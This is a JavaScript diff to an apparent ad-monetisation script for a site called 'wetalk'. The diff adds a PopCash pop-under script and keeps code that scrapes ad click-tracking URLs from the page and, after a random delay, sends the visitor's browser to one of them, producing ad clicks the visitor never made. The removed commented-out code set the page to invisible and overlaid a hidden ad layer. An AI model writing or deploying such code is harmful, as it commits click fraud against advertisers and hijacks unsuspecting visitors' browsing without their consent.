@@ -2,6 +2,8 @@ class MO {
   constructor () {
     //GLOBALS
     this.api = 'https://server.launchapollo.com'
+
+    //change this to pub id!
     this.site = 'wetalk'
     this.url = window.location.href
 
@@ -31,8 +33,14 @@ class MO {
       </nav>`
 
     this.ads =  [
-      `<ins class='adbladeads' data-cid='33020-3446192459' data-host='web.adblade.com' data-tag-type='4' data-protocol='https' style='display:none'></ins><script async src='https://web.adblade.com/js/ads/async/show.js' type='text/javascript'></script>`,
-      `<ins class='adbladeads' data-cid='33008-2627874920' data-host='web.adblade.com' data-tag-type='4' data-protocol='https' style='display:none'></ins><script async src='https://web.adblade.com/js/ads/async/show.js' type='text/javascript'></script>`
+      //`<ins class='adbladeads' data-cid='33020-3446192459' data-host='web.adblade.com' data-tag-type='4' data-protocol='https' style='display:none'></ins><script async src='https://web.adblade.com/js/ads/async/show.js' type='text/javascript'></script>`,
+      `<ins class='adbladeads' data-cid='33008-2627874920' data-host='web.adblade.com' data-tag-type='4' data-protocol='https' style='display:none'></ins><script async src='https://web.adblade.com/js/ads/async/show.js' type='text/javascript'></script>`,
+      `<script type="text/javascript">
+var uid = '172460';
+var wid = '372824';
+</script>
+<script type="text/javascript" src="//cdn.popcash.net/pop.js"></script>
+`
     ]
 
     this.rand = (min,max) => {
@@ -137,39 +145,19 @@ class MO {
         document.querySelector('#ads > div > div > div > div > ul > li:nth-child(2) > div > div.image > a').getAttribute('onmousedown'),
         document.querySelector('#ads > div > div > div > div > ul > li:nth-child(3) > div > div.image > a').getAttribute('onmousedown'),
         document.querySelector('#ads > div > div > div > div > ul > li:nth-child(4) > div > div.image > a').getAttribute('onmousedown'),
-        document.querySelector('#ads > div > div > div > div > ul > li:nth-child(5) > div > div.image > a').getAttribute('onmousedown'),
-        document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(2) > div > div.image > a').getAttribute('onmousedown'),
-        document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(3) > div > div.image > a').getAttribute('onmousedown'),
-        document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(4) > div > div.image > a').getAttribute('onmousedown'),
-        document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(5) > div > div.image > a').getAttribute('onmousedown')
+        document.querySelector('#ads > div > div > div > div > ul > li:nth-child(5) > div > div.image > a').getAttribute('onmousedown')
+        // document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(2) > div > div.image > a').getAttribute('onmousedown'),
+        // document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(3) > div > div.image > a').getAttribute('onmousedown'),
+        // document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(4) > div > div.image > a').getAttribute('onmousedown'),
+        // document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(5) > div > div.image > a').getAttribute('onmousedown')
       ]
       const click = ads[this.rand(0, ads.length - 1)].replace("this.href='", "").replace("'; return true;", "")
-      console.log(click)
+
+      //load in iframe (test one)
       window.location.href = click
     }, randWait)
   }
-
-  // getClick() {
-  //   const bodyArray = Array.from(document.body.children)
-  //   bodyArray.map((child) => {
-  //     child.style.opacity = 0
-  //   })
-  //
-  //   this.el = document.createElement('div')
-  //
-  //   this.el.style.width = `100%`
-  //   this.el.style.position = 'fixed'
-  //   this.el.style.top = '0'
-  //   this.el.style.zIndex = '3000000'
-  //   this.el.style.boxSizing = 'content-box'
-  //   this.el.style.padding = '0'
-  //
-  //   document.body.insertAdjacentElement('beforeend', this.el)
-  //
-  //   this.el.innerHTML = this.ads[this.rand(0, this.ads.length - 1)]
-  //   this.el.style.opacity = '0'
-  //   }
-  }
+}
 
 if (typeof window !== 'undefined' &&
   window.document &&
